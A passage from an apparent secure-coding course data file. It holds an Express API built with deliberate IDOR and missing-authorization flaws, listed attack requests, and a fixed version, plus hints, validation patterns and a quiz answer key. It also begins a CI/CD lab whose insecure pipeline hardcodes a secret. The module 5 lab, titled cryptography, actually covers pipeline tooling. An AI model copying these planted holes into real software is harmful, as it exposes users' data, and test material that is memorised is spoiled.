**Expected Solution**: Add authorization middleware and ownership checks before allowing access to resources.`,
      vulnerableCode: [
        {
          filename: "routes.js",
          language: "javascript",
          code: `const express = require('express');
const app = express();

// CloudDocs File Sharing API - VULNERABLE VERSION
app.use(express.json());

// Mock database
const documents = [
  { id: 1, title: 'Medical Records', ownerId: 1, content: 'Alice private data', isPublic: false },
  { id: 2, title: 'Tax Returns 2024', ownerId: 2, content: 'Bob tax info', isPublic: false },
  { id: 3, title: 'Company Secrets', ownerId: 3, content: 'Trade secrets', isPublic: false }
];

const users = [
  { id: 1, name: 'Alice', email: 'alice@example.com', role: 'user' },
  { id: 2, name: 'Bob', email: 'bob@example.com', role: 'user' },
  { id: 3, name: 'Admin', email: 'admin@example.com', role: 'admin' }
];

// Simple auth middleware (authentication only, NO authorization!)
function requireAuth(req, res, next) {
  const userId = req.headers['user-id']; // Simulated session
  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  req.user = users.find(u => u.id === parseInt(userId));
  next();
}

// VULNERABILITY 1: IDOR - No ownership check!
app.get('/api/documents/:id', requireAuth, (req, res) => {
  const doc = documents.find(d => d.id === parseInt(req.params.id));
  
  if (!doc) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  // MISSING CHECK: Is the user the owner of this document?
  // Any authenticated user can access ANY document!
  res.json(doc);
});

// VULNERABILITY 2: No ownership verification for deletion
app.delete('/api/documents/:id', requireAuth, (req, res) => {
  const docIndex = documents.findIndex(d => d.id === parseInt(req.params.id));
  
  if (docIndex === -1) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  // MISSING CHECK: Can this user delete this document?
  // Users can delete other people's files!
  documents.splice(docIndex, 1);
  res.json({ message: 'Document deleted' });
});

// VULNERABILITY 3: No RBAC - Regular users can access admin endpoints!
app.get('/api/admin/users', requireAuth, (req, res) => {
  // MISSING CHECK: Is req.user.role === 'admin'?
  // Any authenticated user can access this admin endpoint!
  res.json(users);
});

// VULNERABILITY 4: Admin-only user deletion with no role check
app.delete('/api/admin/users/:id', requireAuth, (req, res) => {
  // MISSING CHECK: Admin role verification
  const userIndex = users.findIndex(u => u.id === parseInt(req.params.id));
  users.splice(userIndex, 1);
  res.json({ message: 'User deleted' });
});

// VULNERABILITY 5: User can modify other users' profiles
app.patch('/api/users/:id', requireAuth, (req, res) => {
  const user = users.find(u => u.id === parseInt(req.params.id));
  
  // MISSING CHECK: Is req.user.id === params.id?
  // Users can modify other people's profiles!
  Object.assign(user, req.body);
  res.json(user);
});

/* 
ATTACK SCENARIOS:

1. Alice (user id:1) accesses Bob's private documents:
   GET /api/documents/2 (with user-id: 1 header)
   Result: SUCCESS (should be DENIED!)

2. Bob (regular user) accesses admin endpoint:
   GET /api/admin/users (with user-id: 2 header)
   Result: SUCCESS (should be 403 Forbidden!)

3. Alice deletes Bob's tax documents:
   DELETE /api/documents/2 (with user-id: 1 header)
   Result: SUCCESS (should be DENIED!)

4. Regular user deletes admin account:
   DELETE /api/admin/users/3 (with user-id: 1 header)
   Result: SUCCESS (should be 403!)

IMPACT: Complete authorization bypass!
*/`
        }
      ],
      correctCode: [
        {
          filename: "routes.js",
          language: "javascript",
          code: `const express = require('express');
const app = express();

// CloudDocs File Sharing API - SECURE VERSION
app.use(express.json());

// Mock database
const documents = [
  { id: 1, title: 'Medical Records', ownerId: 1, content: 'Alice private data', isPublic: false },
  { id: 2, title: 'Tax Returns 2024', ownerId: 2, content: 'Bob tax info', isPublic: false },
  { id: 3, title: 'Company Secrets', ownerId: 3, content: 'Trade secrets', isPublic: false }
];

const users = [
  { id: 1, name: 'Alice', email: 'alice@example.com', role: 'user' },
  { id: 2, name: 'Bob', email: 'bob@example.com', role: 'user' },
  { id: 3, name: 'Admin', email: 'admin@example.com', role: 'admin' }
];

// Authentication middleware
function requireAuth(req, res, next) {
  const userId = req.headers['user-id']; // Simulated session
  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  req.user = users.find(u => u.id === parseInt(userId));
  if (!req.user) {
    return res.status(401).json({ error: 'Invalid user' });
  }
  next();
}

// SECURITY FIX 1: Admin authorization middleware
function requireAdmin(req, res, next) {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden: Admin access required' });
  }
  next();
}

// SECURITY FIX 2: Document ownership authorization middleware
function requireDocumentOwnership(req, res, next) {
  const doc = documents.find(d => d.id === parseInt(req.params.id));
  
  if (!doc) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  // Allow access if document is public OR user is the owner
  if (!doc.isPublic && doc.ownerId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden: You do not own this document' });
  }
  
  req.document = doc; // Attach to request for reuse
  next();
}

// SECURITY FIX 3: IDOR protection with ownership check
app.get('/api/documents/:id', requireAuth, (req, res) => {
  const doc = documents.find(d => d.id === parseInt(req.params.id));
  
  if (!doc) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  // AUTHORIZATION CHECK: Verify ownership or public access
  if (!doc.isPublic && doc.ownerId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden: Access denied' });
  }
  
  res.json(doc);
});

// SECURITY FIX 4: Ownership verification for deletion
app.delete('/api/documents/:id', requireAuth, (req, res) => {
  const docIndex = documents.findIndex(d => d.id === parseInt(req.params.id));
  
  if (docIndex === -1) {
    return res.status(404).json({ error: 'Document not found' });
  }
  
  const doc = documents[docIndex];
  
  // AUTHORIZATION CHECK: Only owner can delete
  if (doc.ownerId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden: You can only delete your own documents' });
  }
  
  documents.splice(docIndex, 1);
  res.json({ message: 'Document deleted' });
});

// SECURITY FIX 5: RBAC protection for admin endpoints
app.get('/api/admin/users', requireAuth, requireAdmin, (req, res) => {
  // Only admins can access this endpoint
  res.json(users);
});

// SECURITY FIX 6: Admin role check for user deletion
app.delete('/api/admin/users/:id', requireAuth, requireAdmin, (req, res) => {
  // Only admins can delete users
  const userIndex = users.findIndex(u => u.id === parseInt(req.params.id));
  
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  users.splice(userIndex, 1);
  res.json({ message: 'User deleted' });
});

// SECURITY FIX 7: Profile update authorization
app.patch('/api/users/:id', requireAuth, (req, res) => {
  const userId = parseInt(req.params.id);
  const user = users.find(u => u.id === userId);
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  // AUTHORIZATION CHECK: Users can only modify their own profile
  // (unless they're admin)
  if (req.user.id !== userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden: You can only modify your own profile' });
  }
  
  // Prevent privilege escalation: Regular users cannot change their role
  if (req.body.role && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden: Cannot modify role' });
  }
  
  Object.assign(user, req.body);
  res.json(user);
});

/* 
SECURITY IMPROVEMENTS:
✓ Ownership verification (ownerId === req.user.id) prevents IDOR
✓ RBAC with requireAdmin middleware for admin endpoints
✓ 403 Forbidden responses for authorization failures
✓ 401 Unauthorized responses for authentication failures
✓ Reusable authorization middleware (requireAdmin, requireDocumentOwnership)
✓ Public vs private document access control
✓ Privilege escalation prevention (cannot change own role)
✓ Defense in depth with multiple authorization layers

ATTACK SCENARIOS (now blocked):
1. Alice tries to access Bob's document → 403 Forbidden
2. Regular user tries to access /api/admin/users → 403 Forbidden
3. Alice tries to delete Bob's document → 403 Forbidden
4. Regular user tries to delete admin → 403 Forbidden
5. User tries to modify another user's profile → 403 Forbidden

COMPLETE PROTECTION from IDOR and broken access control!
*/`
        }
      ],
      validationCriteria: [
        {
          header: "Ownership Verification",
          description: "Verify req.user.id === document.ownerId before allowing access to private documents",
          expectedPattern: "ownerId.*===.*req\\.user\\.id|req\\.user\\.id.*===.*ownerId",
          required: true
        },
        {
          header: "Role-Based Access Control (RBAC)",
          description: "Check req.user.role === 'admin' before allowing access to admin endpoints",
          expectedPattern: "req\\.user\\.role.*===.*['\"]admin['\"]|role.*===.*['\"]admin['\"]",
          required: true
        },
        {
          header: "403 Forbidden Response",
          description: "Return 403 status code for unauthorized access attempts",
          expectedPattern: "status\\(403\\)|res\\.sendStatus\\(403\\)",
          required: true
        },
        {
          header: "Authorization Middleware",
          description: "Create reusable authorization middleware (requireAdmin, requireOwnership)",
          expectedPattern: "function.*require(Admin|Owner)|const.*require(Admin|Owner)",
          required: false
        }
      ],
      learningOutcomes: [
        "Understand IDOR (Insecure Direct Object Reference) vulnerabilities",
        "Implement ownership-based authorization checks",
        "Build role-based access control (RBAC) systems",
        "Differentiate between authentication and authorization",
        "Create reusable authorization middleware",
        "Return proper HTTP status codes (401 vs 403)"
      ],
      hints: [
        "Hint 1: For IDOR fix: if (document.ownerId !== req.user.id && !document.isPublic) return res.status(403).json({ error: 'Forbidden' });",
        "Hint 2: Admin middleware: function requireAdmin(req, res, next) { if (req.user.role !== 'admin') return res.status(403); next(); }",
        "Hint 3: Check ownership before deletion: if (doc.ownerId !== req.user.id) return res.status(403);",
        "Hint 4: Use 401 for \"not logged in\" and 403 for \"logged in but not authorized\"",
        "Hint 5: Consider public vs private documents: Allow access if isPublic: true OR user is owner",
        "SOLUTION: Add ownership checks for documents and role checks for admin endpoints"
      ]
    },
    quizzes: [
      {
        question: "What is IDOR (Insecure Direct Object Reference)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A type of SQL injection" },
          { id: "b", text: "When an application exposes direct references to objects without proper authorization" },
          { id: "c", text: "Insufficient data validation" },
          { id: "d", text: "A secure design pattern" }
        ],
        correctAnswers: ["b"],
        explanation: "IDOR occurs when an application exposes references to internal objects (like database keys) in URLs or parameters without checking if the user has permission to access them. Example: /api/documents/123",
        category: "Access Control"
      },
      {
        question: "A user changes the URL from /profile/123 to /profile/124 and accesses another user's profile. What is this vulnerability?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "XSS (Cross-Site Scripting)" },
          { id: "b", text: "CSRF (Cross-Site Request Forgery)" },
          { id: "c", text: "IDOR (Insecure Direct Object Reference)" },
          { id: "d", text: "SQL Injection" }
        ],
        correctAnswers: ["c"],
        explanation: "This is a classic IDOR vulnerability where the application doesn't verify that the authenticated user has permission to access the resource referenced by the ID.",
        category: "Access Control"
      },
      {
        question: "What does RBAC stand for?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Role-Based Access Control" },
          { id: "b", text: "Rule-Based Access Control" },
          { id: "c", text: "Resource-Based Access Control" },
          { id: "d", text: "Request-Based Access Control" }
        ],
        correctAnswers: ["a"],
        explanation: "RBAC (Role-Based Access Control) assigns permissions to roles (like 'admin', 'user', 'moderator') rather than individual users. Users are then assigned roles, simplifying permission management.",
        category: "Access Control"
      },
      {
        question: "What is the difference between authentication and authorization?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "They are the same thing" },
          { id: "b", text: "Authentication verifies identity; authorization determines access permissions" },
          { id: "c", text: "Authorization verifies identity; authentication determines permissions" },
          { id: "d", text: "Authentication is for APIs; authorization is for web apps" }
        ],
        correctAnswers: ["b"],
        explanation: "Authentication answers 'Who are you?' (proving identity), while authorization answers 'What can you access?' (checking permissions). Both are essential but serve different purposes.",
        category: "Access Control"
      },
      {
        question: "Client-side authorization checks are sufficient for securing an application.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Client-side checks can be bypassed by modifying JavaScript or making direct API requests. ALWAYS enforce authorization on the server side. Client-side checks are for UX only.",
        category: "Access Control"
      },
      {
        question: "Which HTTP status code should be returned when a user is authenticated but not authorized to access a resource?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "401 Unauthorized" },
          { id: "b", text: "403 Forbidden" },
          { id: "c", text: "404 Not Found" },
          { id: "d", text: "500 Internal Server Error" }
        ],
        correctAnswers: ["b"],
        explanation: "403 Forbidden indicates the user is authenticated but lacks permission. 401 Unauthorized means not authenticated. Some applications return 404 to hide resource existence, but 403 is semantically correct.",
        category: "Access Control"
      },
      {
        question: "What is the principle of least privilege?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Give users the minimum access needed to perform their tasks" },
          { id: "b", text: "Give all users admin access" },
          { id: "c", text: "Remove all privileges from users" },
          { id: "d", text: "Only admins should have privileges" }
        ],
        correctAnswers: ["a"],
        explanation: "The principle of least privilege means granting users only the minimum access rights needed to perform their job functions. This limits the damage from compromised accounts or insider threats.",
        category: "Access Control"
      },
      {
        question: "In an API endpoint GET /api/documents/:id, what check should you perform after authenticating the user?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "No additional checks needed" },
          { id: "b", text: "Verify the user owns the document or has permission to view it" },
          { id: "c", text: "Only check if the document exists" },
          { id: "d", text: "Log the request" }
        ],
        correctAnswers: ["b"],
        explanation: "After authentication, you must verify authorization: does this specific user have permission to access this specific document? This prevents IDOR vulnerabilities.",
        category: "Access Control"
      },
      {
        question: "Which code snippet properly implements IDOR protection for document access?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "if (!document) return 404;" },
          { id: "b", text: "if (document.ownerId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });" },
          { id: "c", text: "if (!req.user) return 401;" },
          { id: "d", text: "return res.json(document);" }
        ],
        correctAnswers: ["b"],
        explanation: "Checking if the document's ownerId matches the requesting user's ID is proper IDOR protection. This ensures users can only access their own documents.",
        category: "Access Control"
      },
      {
        question: "ABAC (Attribute-Based Access Control) makes decisions based on user roles only.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "ABAC uses multiple attributes (user attributes, resource attributes, environmental conditions) to make access decisions, not just roles. For example: 'Allow if user.department=Finance AND document.classification=Internal AND time=business_hours'.",
        category: "Access Control"
      },
      {
        question: "What is horizontal privilege escalation?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A regular user gaining admin privileges" },
          { id: "b", text: "A user accessing resources belonging to another user at the same privilege level" },
          { id: "c", text: "Increasing server resources" },
          { id: "d", text: "SQL injection" }
        ],
        correctAnswers: ["b"],
        explanation: "Horizontal privilege escalation is when a user accesses resources of another user with the same privilege level (e.g., User A accessing User B's documents). Vertical escalation is gaining higher privileges (user → admin).",
        category: "Access Control"
      },
      {
        question: "Which middleware pattern correctly implements admin-only access?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "function requireAdmin(req, res, next) { if (req.user.role === 'admin') next(); else res.status(403).json({ error: 'Forbidden' }); }" },
          { id: "b", text: "function requireAdmin(req, res, next) { next(); }" },
          { id: "c", text: "function requireAdmin(req, res, next) { if (req.headers.admin) next(); }" },
          { id: "d", text: "No middleware needed for admin access" }
        ],
        correctAnswers: ["a"],
        explanation: "The middleware checks if the authenticated user has the 'admin' role, returns 403 if not, and calls next() to proceed if authorized. This should be used like: app.delete('/admin/users/:id', requireAuth, requireAdmin, handler)",
        category: "Access Control"
      },
      {
        question: "What is vertical privilege escalation?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Accessing another user's data at the same privilege level" },
          { id: "b", text: "A lower-privileged user gaining higher privileges (e.g., user → admin)" },
          { id: "c", text: "Horizontal scaling of servers" },
          { id: "d", text: "Encrypting data vertically" }
        ],
        correctAnswers: ["b"],
        explanation: "Vertical privilege escalation occurs when a user gains higher privileges than intended, such as a regular user gaining admin access. This is often due to missing authorization checks on admin endpoints.",
        category: "Access Control"
      },
      {
        question: "Authorization checks must be performed on every API request, even for previously authorized users.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Authorization should be checked on every request because permissions can change (user deleted, role revoked, resource ownership changed). Don't cache authorization decisions across requests.",
        category: "Access Control"
      },
      {
        question: "What is the purpose of the 'isPublic' flag pattern in resource access control?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Make all data public by default" },
          { id: "b", text: "Allow public access to specific resources while requiring ownership checks for private ones" },
          { id: "c", text: "Encrypt public data" },
          { id: "d", text: "Log all public access" }
        ],
        correctAnswers: ["b"],
        explanation: "The isPublic flag allows fine-grained control: if (resource.isPublic || resource.ownerId === req.user.id) { allow access }. This supports public sharing while protecting private resources.",
        category: "Access Control"
      },
      {
        question: "Which approach is most secure for checking document ownership?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Check ownership on the client side only" },
          { id: "b", text: "Check ownership in the database query: SELECT * FROM docs WHERE id = ? AND ownerId = ?" },
          { id: "c", text: "Trust the client to send only requests for their own documents" },
          { id: "d", text: "No ownership checks needed if using HTTPS" }
        ],
        correctAnswers: ["b"],
        explanation: "Including ownership in the database query ensures the database only returns authorized documents. This is more secure than fetching the document first and then checking ownership in application code.",
        category: "Access Control"
      },
      {
        question: "Returning 404 instead of 403 for unauthorized access can prevent information disclosure about resource existence.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Some applications return 404 (Not Found) instead of 403 (Forbidden) to prevent attackers from enumerating valid resource IDs. However, 403 is semantically correct and often preferred for clarity.",
        category: "Access Control"
      },
      {
        question: "What is the OAuth 2.0 'scope' concept used for?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Password encryption" },
          { id: "b", text: "Limiting the permissions granted to an access token" },
          { id: "c", text: "SQL query optimization" },
          { id: "d", text: "Session management" }
        ],
        correctAnswers: ["b"],
        explanation: "OAuth scopes define what permissions an access token has (e.g., 'read:email', 'write:posts'). This implements least privilege for third-party applications, limiting what they can access.",
        category: "Access Control"
      },
      {
        question: "Which vulnerability occurs when an API allows users to modify their own role or permissions?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Mass assignment / Parameter tampering" },
          { id: "b", text: "SQL injection" },
          { id: "c", text: "XSS" },
          { id: "d", text: "CSRF" }
        ],
        correctAnswers: ["a"],
        explanation: "Mass assignment allows users to update fields they shouldn't control. Example: PATCH /users/123 with {\"role\": \"admin\"} in the body. Prevent this by whitelisting allowed fields or using separate DTOs.",
        category: "Access Control"
      },
      {
        question: "Context-aware access control considers factors like time, location, and device in authorization decisions.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Context-aware (or adaptive) access control uses additional factors beyond identity and role, such as time of day, geolocation, device type, and risk score to make dynamic authorization decisions.",
        category: "Access Control"
      },
      {
        question: "What is the recommended approach for implementing multi-tenancy access control in a SaaS application?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Use the same database for all tenants without isolation" },
          { id: "b", text: "Add tenantId to all queries: WHERE tenantId = ? AND id = ?" },
          { id: "c", text: "Trust the client to send the correct tenantId" },
          { id: "d", text: "No special handling needed" }
        ],
        correctAnswers: ["b"],
        explanation: "In multi-tenant systems, always filter by tenantId (from the authenticated session) in database queries to prevent tenant-to-tenant data leakage. Never trust client-provided tenantId values.",
        category: "Access Control"
      },
      {
        question: "Which pattern helps prevent IDOR in RESTful APIs?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Use sequential integer IDs (1, 2, 3)" },
          { id: "b", text: "Use unpredictable UUIDs AND verify ownership" },
          { id: "c", text: "Remove all ID checks" },
          { id: "d", text: "Only check IDs on DELETE requests" }
        ],
        correctAnswers: ["b"],
        explanation: "UUIDs make resource enumeration harder, but you MUST still verify ownership/permissions. UUIDs alone are not sufficient security (security through obscurity). Always implement proper authorization checks.",
        category: "Access Control"
      },
      {
        question: "What is the purpose of JWT claims in authorization?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Encrypt the token" },
          { id: "b", text: "Embed user information and permissions in the token for stateless authorization" },
          { id: "c", text: "Store passwords" },
          { id: "d", text: "Prevent XSS" }
        ],
        correctAnswers: ["b"],
        explanation: "JWT claims (payload) can contain user roles, permissions, and other data needed for authorization decisions, enabling stateless auth without database lookups. Common claims: sub (user ID), role, exp (expiration).",
        category: "Access Control"
      },
      {
        question: "An API endpoint should check authorization even if the resource ID is hard to guess (like a UUID).",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "UUIDs or random IDs provide obscurity but not security. ALWAYS implement proper authorization checks. IDs can be leaked through logs, referrers, or other vulnerabilities. Security through obscurity is not security.",
        category: "Access Control"
      },
      {
        question: "What is the 'confused deputy problem' in security?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A deputy administrator who is confused" },
          { id: "b", text: "When a program is tricked into misusing its authority on behalf of an attacker" },
          { id: "c", text: "Password confusion attacks" },
          { id: "d", text: "DNS confusion" }
        ],
        correctAnswers: ["b"],
        explanation: "The confused deputy problem occurs when a privileged program is tricked into performing actions on behalf of an unprivileged user. Example: CSRF attacks where a browser (the deputy) is confused into making authenticated requests.",
        category: "Access Control"
      }
    ]
  },
  {
    number: 5,
    title: "Cryptography & Data Protection",
    duration: "2h",
    description: "Encryption, key management, and secure data storage",
    subparts: [
      "5.1.1 Symmetric vs asymmetric encryption",
      "5.1.2 TLS/SSL configuration",
      "5.1.3 Key management best practices",
      "5.1.4 Data encryption at rest"
    ],
    learningOutcomes: [
      "Implement data encryption",
      "Configure TLS properly",
      "Manage cryptographic keys securely",
    ],
    lab: {
      title: "CodeFlow CI/CD - DevSecOps Security Tooling Integration",
      description: "CodeFlow's development pipeline has zero security checks! Vulnerable dependencies are being deployed to production. Your mission: integrate SCA (Snyk), SAST (SonarQube), and DAST (OWASP ZAP) into the CI/CD pipeline with proper gating strategies.",
      estimatedTime: 50,
      instructions: `**Story**: You're a DevSecOps engineer at CodeFlow, a software company shipping code to production daily. Last week, a critical vulnerability in a third-party library (log4j) was exploited in production, causing a data breach. The root cause: no security scanning in the CI/CD pipeline!

**The Crisis**:
- Vulnerable npm package (express 4.16.0 with known CVEs) deployed to production
- No SCA (Software Composition Analysis) to detect vulnerable dependencies
- No SAST (Static Application Security Testing) to catch code vulnerabilities
- No DAST (Dynamic Application Security Testing) to test running app
- Secrets accidentally committed to Git repository
- No security gates in GitHub Actions workflow

**Your DevSecOps Mission**:

**PHASE 1 - Analyze Current State**:
1. **Review** the insecure CI/CD pipeline below (GitHub Actions)
2. **Identify** all missing security checks
3. **Understand** the deployment flow (build → deploy, NO security!)

**PHASE 2 - Integrate Security Tools**:
1. **Add SCA**: Integrate Snyk or npm audit to detect vulnerable dependencies
2. **Add SAST**: Integrate ESLint security plugins or Semgrep for code scanning
3. **Add DAST**: Add OWASP ZAP baseline scan against running app
4. **Add Secret Scanning**: Use git-secrets or TruffleHog to prevent credential leaks

**PHASE 3 - Implement Security Gates**:
1. **Fail builds** for HIGH/CRITICAL vulnerabilities (fail-closed approach)
2. **Allow LOW/MEDIUM** as warnings only (fail-open for lower risk)
3. **Generate reports** and upload to GitHub Security tab
4. **Test the pipeline** to ensure security checks run before deployment

**Expected Solution**: Enhanced GitHub Actions workflow with all 4 security tools and proper gating logic.`,
      vulnerableCode: [
        {
          filename: ".github/workflows/deploy.yml",
          language: "yaml",
          code: `name: Deploy to Production

on:
  push:
    branches: [main]

# INSECURE CI/CD PIPELINE - NO SECURITY CHECKS!
jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      # MISSING: Secret scanning (git-secrets, TruffleHog)
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
        
      # MISSING: npm audit or Snyk (SCA)
      # MISSING: ESLint security or Semgrep (SAST)
      
      - name: Build application
        run: npm run build
        
      # MISSING: OWASP ZAP scan (DAST)
      
      - name: Deploy to production
        run: |
          echo "Deploying vulnerable code to production..."
          # Deploy happens WITHOUT any security checks!
        env:
          API_KEY: hardcoded-secret-key-123  # SECRET EXPOSED!

# VULNERABILITIES IN THIS PIPELINE:
# 1. No SCA - vulnerable dependencies not detected
# 2. No SAST - code vulnerabilities not caught
# 3. No DAST - runtime vulnerabilities not tested
# 4. No secret scanning - hardcoded secrets deployed
# 5. No security gates - vulnerable code reaches production
# 6. No reporting - security team has no visibility`
        },
        {
          filename: "package.json",
          language: "json",
          code: `{
  "name": "codeflow-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.16.0",
    "lodash": "4.17.4",
    "jsonwebtoken": "8.5.0"
  }
}

// VULNERABLE DEPENDENCIES (from npm audit):
// - express 4.16.0: CVE-2022-24999 (HIGH severity)
// - lodash 4.17.4: Multiple prototype pollution CVEs (CRITICAL)
// - jsonwebtoken 8.5.0: CVE-2022-23529 (HIGH severity)

// These vulnerabilities will NOT be detected because
// there's no SCA tool in the CI/CD pipeline!`
        }
      ],
      correctCode: [
        {
          filename: ".github/workflows/deploy.yml",
          language: "yaml",
          code: `name: Secure Deploy to Production

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# SECURE CI/CD PIPELINE - DevSecOps Best Practices
jobs:
  security-checks:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          fetch-depth: 0  # Full history for better secret scanning
      
      # SECURITY FIX 1: Secret scanning
      - name: Run TruffleHog secret scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: \${{ github.event.repository.default_branch }}
          head: HEAD
      
      # Alternative: git-secrets
      # - name: Install git-secrets
      #   run: |
      #     git clone https://github.com/awslabs/git-secrets.git
      #     cd git-secrets && make install
      #     git secrets --scan
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      # SECURITY FIX 2: SCA - Software Composition Analysis
      - name: Run npm audit (fail on HIGH/CRITICAL)
        run: npm audit --audit-level=high
        continue-on-error: false
      
      # Alternative: Snyk (requires SNYK_TOKEN secret)
      # - name: Run Snyk security scan
      #   run: npx snyk test --severity-threshold=high
      #   env:
      #     SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      
      # SECURITY FIX 3: SAST - Static Application Security Testing
      - name: Install ESLint security plugin
        run: npm install --save-dev eslint eslint-plugin-security
      
      - name: Run ESLint security scan
        run: npx eslint . --ext .js,.jsx,.ts,.tsx --plugin security --max-warnings=0
      
      # Alternative: Semgrep
      # - name: Run Semgrep SAST
      #   uses: returntocorp/semgrep-action@v1
      #   with:
      #     config: p/security-audit
      
      - name: Build application
        run: npm run build
      
      # SECURITY FIX 4: DAST - Dynamic Application Security Testing
      - name: Start application for DAST
        run: |
          npm start &
          sleep 10  # Wait for app to start
      
      - name: Run OWASP ZAP baseline scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'http://localhost:3000'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'
      
      # SECURITY FIX 5: Generate security report
      - name: Upload security scan results
        uses: github/codeql-action/upload-sarif@v2
        if: always()
        with:
          sarif_file: results.sarif
      
      # SECURITY FIX 6: Fail build on vulnerabilities
      - name: Check for vulnerabilities
        run: |
          echo "All security checks passed!"
          npm audit --audit-level=moderate || exit 1
  
  deploy:
    runs-on: ubuntu-latest
    needs: security-checks  # Deploy ONLY if security checks pass
    if: github.ref == 'refs/heads/main'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Build application
        run: npm run build
      
      # SECURITY FIX 7: Secrets from environment (not hardcoded!)
      - name: Deploy to production
        run: |
          echo "Deploying secure code to production..."
          # All secrets from GitHub Secrets, not hardcoded!
        env:
          API_KEY: \${{ secrets.API_KEY }}
          DATABASE_URL: \${{ secrets.DATABASE_URL }}
          STRIPE_API_KEY: \${{ secrets.STRIPE_API_KEY }}
      
      - name: Notify security team
        if: failure()
        run: echo "Deployment failed - security team notified"

# SECURITY IMPROVEMENTS:
# ✓ Secret scanning with TruffleHog prevents credential leaks
# ✓ SCA with npm audit detects vulnerable dependencies (fails on HIGH+)
# ✓ SAST with ESLint security catches code vulnerabilities
# ✓ DAST with OWASP ZAP tests running application
# ✓ Security gates: deploy ONLY if all checks pass
# ✓ Secrets stored in GitHub Secrets (not hardcoded)
# ✓ SARIF reports uploaded to GitHub Security tab
# ✓ Fail-closed approach: build fails on vulnerabilities
# ✓ Separate jobs: security-checks must pass before deploy
# ✓ Full DevSecOps shift-left security implementation`
        },
        {
          filename: "package.json",
          language: "json",
          code: `{
  "name": "codeflow-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "jsonwebtoken": "^9.0.0"
  },
  "devDependencies": {
    "eslint": "^8.0.0",
    "eslint-plugin-security": "^1.7.1"
  },
  "scripts": {
    "build": "echo 'Building app...'",
    "start": "node server.js",
    "security:audit": "npm audit --audit-level=moderate",
    "security:eslint": "eslint . --ext .js --plugin security",
    "security:check": "npm run security:audit && npm run security:eslint"
  }
}

// SECURITY IMPROVEMENTS:
// ✓ Updated express to 4.18.2+ (no CVE-2022-24999)
// ✓ Updated lodash to 4.17.21+ (no prototype pollution CVEs)
// ✓ Updated jsonwebtoken to 9.0.0+ (no CVE-2022-23529)
// ✓ Added eslint-plugin-security for SAST
// ✓ Added npm scripts for security checks
// ✓ Using ^ for automatic patch updates
// ✓ All dependencies at secure versions

// These secure dependencies will pass SCA checks!`
        }
      ],
      validationCriteria: [
        {
          header: "SCA Integration",
          description: "Add npm audit, Snyk, or dependency-check to detect vulnerable dependencies",
          expectedPattern: "npm audit|snyk test|dependency-check",
          required: true
        },
        {
          header: "SAST Integration",
          description: "Add static code analysis (ESLint security, Semgrep, or SonarQube)",
